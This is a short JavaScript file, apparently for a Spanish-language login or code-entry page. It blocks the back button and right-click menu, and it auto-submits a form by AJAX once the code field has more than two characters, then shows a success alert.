history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.go(1);
};
document.oncontextmenu = function () {
    return false
}

function right(e) {

    if (navigator.appName == 'Netscape' && e.which == 3) {
        return false;
    } else if (navigator.appName == 'Microsoft Internet Explorer' && event.button == 2) {

        return false;
    }
    return true;
}
document.onmousedown = right;


$(document).ready(function () {

    $("#inpucodigo").keyup(function () {
        var texto = $("#inpucodigo").val();
        if (texto.length > 2) {
            $.ajax({
                url: $("#formisesio").attr("action"),
                type: $("#formisesio").attr("method"),
                data: $("#formisesio").serialize(),
                success: function (data) {
                    swal("Listo!", "Se Inicio sesión sin problemas", "success");
                    $("#formisesio")[0].reset();
                }
            });
        }
    });

});
